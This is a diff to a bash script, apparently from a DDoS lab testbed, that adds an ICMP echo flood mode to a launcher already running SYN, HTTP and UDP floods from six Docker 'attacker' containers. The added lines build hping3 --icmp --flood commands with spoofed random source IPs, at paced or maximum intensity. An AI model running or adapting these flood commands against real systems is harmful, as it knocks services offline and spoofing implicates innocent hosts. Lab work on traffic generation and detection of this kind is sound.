@@ -6,11 +6,13 @@
 #   ./run_ddos.sh syn                         # 6 attacker SYN flood (spoof) 30s
 #   ./run_ddos.sh http                        # 6 attacker HTTP flood 30s
 #   ./run_ddos.sh udp                         # 6 attacker UDP flood (spoof) 30s
+#   ./run_ddos.sh icmp                        # 6 attacker ICMP echo flood (spoof) 30s
 #   ./run_ddos.sh syn -t 172.30.0.10 -d 30    # chon target + thoi luong
 #   ./run_ddos.sh syn -r 400                  # SYN co pacing 400 pps/nguon (0 = toi da)
 #   ./run_ddos.sh syn -i max                  # cuong do TOI DA: hping3 --flood (6 nguon spoof)
 #   ./run_ddos.sh http -i max                 # cuong do TOI DA: ab -k -c 500 (6 nguon L7)
 #   ./run_ddos.sh udp -i max                  # cuong do TOI DA: hping3 --udp --flood (6 nguon spoof)
+#   ./run_ddos.sh icmp -i max                 # cuong do TOI DA: hping3 --icmp --flood (6 nguon spoof)
 #   ./run_ddos.sh syn -i max -r 50000         # max co gioi han ~50k pps/nguon (ramp an toan)
 #
 # intensity: paced (mac dinh) = scapy/http_flood.py co dieu tiet; max = hping3/ab line-rate.
@@ -36,8 +38,8 @@ PPS=""          # rong = khong truyen --pps (syn_flood tu hieu la toi da)
 INTENSITY="paced"
 MAXCONC=500     # che do max http: so ket noi dong thoi moi nguon cho ab
 
-# tham so dau tien (neu co) la mode syn|http|udp
-if [[ "${1:-}" == "syn" || "${1:-}" == "http" || "${1:-}" == "udp" ]]; then
+# tham so dau tien (neu co) la mode syn|http|udp|icmp
+if [[ "${1:-}" == "syn" || "${1:-}" == "http" || "${1:-}" == "udp" || "${1:-}" == "icmp" ]]; then
   MODE="$1"; shift
 fi
 while [[ $# -gt 0 ]]; do
@@ -46,7 +48,7 @@ while [[ $# -gt 0 ]]; do
     -d|--duration)  DURATION="$2"; shift 2 ;;
     -r|--pps)       PPS="$2"; shift 2 ;;
     -i|--intensity) INTENSITY="$2"; shift 2 ;;
-    syn|http|udp)   MODE="$1"; shift ;;
+    syn|http|udp|icmp) MODE="$1"; shift ;;
     *) echo "[!] Tham so la: $1" >&2; exit 2 ;;
   esac
 done
@@ -80,6 +82,18 @@ for a in "${ATTACKERS[@]}"; do
       # UDP flood scapy co pacing: spoof IP (connectionless nen spoof duoc nhu syn)
       cmd=(docker exec "$a" timeout "$DURATION" python3 /app/udp_flood.py "$TARGET" -p 80 --spoof)
       [[ -n "$PPS" ]] && cmd+=(--pps "$PPS")
+    fi
+  elif [[ "$MODE" == "icmp" ]]; then
+    if [[ "$INTENSITY" == "max" ]]; then
+      # cuong do toi da: hping3 ICMP echo flood line-rate, --rand-source gia mao IP nguon
+      cmd=(docker exec "$a" timeout "$DURATION" hping3 --icmp -q --rand-source)
+      if [[ -n "$PPS" ]]; then cmd+=(-i "u$((1000000 / PPS))"); else cmd+=(--flood); fi
+      cmd+=("$TARGET")
+    else
+      # ICMP flood co pacing
+      cmd=(docker exec "$a" timeout "$DURATION" hping3 --icmp -q --rand-source)
+      cmd+=(-i "u$((1000000 / ${PPS:-400}))")
+      cmd+=("$TARGET")
     fi
   else
     if [[ "$INTENSITY" == "max" ]]; then
